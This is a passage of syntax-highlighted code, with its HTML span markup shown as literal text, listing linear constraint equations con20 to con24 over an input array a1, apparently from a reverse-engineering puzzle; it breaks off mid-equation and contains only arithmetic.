con20 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;170184&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;137671&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85374&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73658&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;230891&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54346&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;280694&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60411&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27171&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50618&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11843&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;131778&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13956&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42562&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19972&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;145797&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58717&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74613584&lt;/span&gt;
con21 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;242475&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;234385&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;124653&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;287929&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;190916&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;277578&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41625&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67262&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;250144&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;70886&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;223492&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;179651&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;206538&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;161965&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;146258&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;167068&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;196330&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76353817&lt;/span&gt;
con22 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;29700&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60542&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;274107&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;154914&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;143185&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;167424&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;137439&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;186151&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77157&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;233090&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;27400&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76557&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108002&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103161&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;133956&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;219502&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;202897&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;250957&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;119297&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100812197&lt;/span&gt;
con23 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;171971&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38740&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31661&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;194653&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;295910&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;136489&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;212619&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;165592&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;211791&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;156909&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;232187&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73709&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;79735&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;184882&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111105&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;148840&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35774&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;275711&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;135265&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;141221&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39117122&lt;/span&gt;
con24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;186514&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7791&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;276755&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;294815&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;238763&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;146099&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;184977&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;178413&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;287303&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71946&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;73771&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;129032&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;200202&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;150509&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;156625&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14093&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192584&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;122770&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;255494&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108479&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span 